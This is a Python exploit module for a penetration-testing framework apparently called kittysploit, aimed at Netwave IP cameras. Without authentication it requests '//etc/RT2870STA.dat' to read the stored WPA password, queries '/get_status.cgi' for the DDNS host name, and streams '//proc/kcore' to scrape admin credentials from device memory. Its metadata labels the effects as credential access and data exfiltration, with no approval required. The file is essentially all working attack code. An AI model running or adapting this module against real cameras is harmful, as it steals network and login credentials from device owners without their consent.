#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Netwave IP Camera Information Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Netwave IP Camera Information Disclosure',
        'description': 'This exploit will try to retrieve WPA password and ddns host name, Also it would try to read memory leak in order to find username and password',
        'author': ['spiritnull', 'renos stoikos'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/41236/'],
        'tags': ['iot', 'camera', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            response = self.http_request(
                method="GET",
                path="//etc/RT2870STA.dat",
            )

            if response is not None and "WPAPSK" in response.text:
                print_success("WPA Password is in this text:")
                print_info(response.text)
            else:
                print_error("Could not find WPA password")

            print_info("Trying to gather more info")
            response = self.http_request(
                method="GET",
                path="/get_status.cgi",
            )
            if response is not None and "ddns_host" in response.text:
                print_success("ddns host name:")
                print_info(response.text)
            else:
                print_error("could not read ddns host name")

            print_status("Trying to find username and password from running memory leak")
            print_status("This could take some time")
            print_status("password is usually stuck next to 'admin' e.g admin123456")
            response = self.http_request(
                method="GET",
                path="//proc/kcore",
                stream=True
            )
            try:
                for chunk in response.iter_content(chunk_size=100):
                    if "admin" in chunk:
                        print_success(chunk)
            except Exception:
                print_error("Exploit failed - could not read /proc/kcore")
    def check(self):
        check1 = self.http_request(
            method="GET",
            path="//etc/RT2870STA.dat",
        )
        if check1 is not None and check1.status_code == 200 and "WPAPSK" in check1.text:
            return True

        check2 = self.http_request(
            method="GET",
            path="/get_status.cgi",
        )

        if check2 is not None and check2.status_code == 200 and "ddns" in check2.text:
            return True

        return False
